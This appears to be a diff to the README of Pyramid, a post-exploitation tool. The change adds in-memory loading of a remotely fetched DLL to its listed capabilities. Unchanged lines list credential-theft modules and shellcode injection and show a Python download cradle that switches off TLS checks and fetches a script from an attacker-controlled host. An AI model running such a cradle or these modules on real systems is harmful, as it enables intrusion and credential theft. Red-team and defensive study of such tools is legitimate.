@@ -43,6 +43,7 @@ Pyramid capabilities are executed directly from python.exe process and are curre
  1. Dynamic loading of BloodHound Python, impacket secretsdump, paramiko, DonPAPI, LaZagne, Pythonnet, pproxy.
  2. BOFs execution using in-process shellcode injection.
  3. In-process injection of a C2 agent and tunneling its traffic with local SSH port forwarding.
+ 4. In-memory loading of a remotely fetched dll via MemoryModule technique.
 
 ### Tool's description
 
@@ -68,7 +69,8 @@ There are currently 8 main base scripts available:
  5. **base-DonPAPI.py** script will in-memory import and execute [DonPAPI](https://github.com/login-securite/DonPAPI). Results and credentials extracted are saved on disk in the Python Embeddable Package Directory.
  6. **base-LaZagne.py** script will in-memory import and execute [LaZagne](https://github.com/AlessandroZ/LaZagne)
  7. **base-tunnel-socks5** script import and executes paramiko on a new Thread to create an SSH remote port forward to an SSH server, then a socks5 proxy server is executed locally on target and made accessible remotely through the SSH tunnel. 
- 8.  **base-clr** script imports Pythonnet to load and execute a .NET assembly in-memory.
+ 8. **base-clr** script imports Pythonnet to load and execute a .NET assembly in-memory.
+ 9. **base-pythonmemorymodule** script import [PythonMemoryModule](https://github.com/rkbennett/PythonMemoryModule) to load a dll from memory.
 
 
 ### Usage
@@ -131,6 +133,9 @@ Insert HTTPS credentials in the upper part of the script and assembly bytes of t
 
 Insert parameters in the upper part of the script.
 
+#### base-pythonmemorymodule.py 
+
+Insert parameters in the upper part of the script and the right dll procedure to be called.
 
 #### Unzip embeddable package and execute the download cradle on target
 
@@ -144,7 +149,7 @@ import ssl
 gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 gcontext.check_hostname = False
 gcontext.verify_mode = ssl.CERT_NONE
-request = urllib.request.Request('https://myIP/base-bof.py')
+request = urllib.request.Request('https://myIP/INSERT-BASE-SCRIPT-HERE.py')
 base64string = base64.b64encode(bytes('%s:%s' % ('testuser', 'Sup3rP4ss!'),'ascii'))
 request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
 result = urllib.request.urlopen(request, context=gcontext)
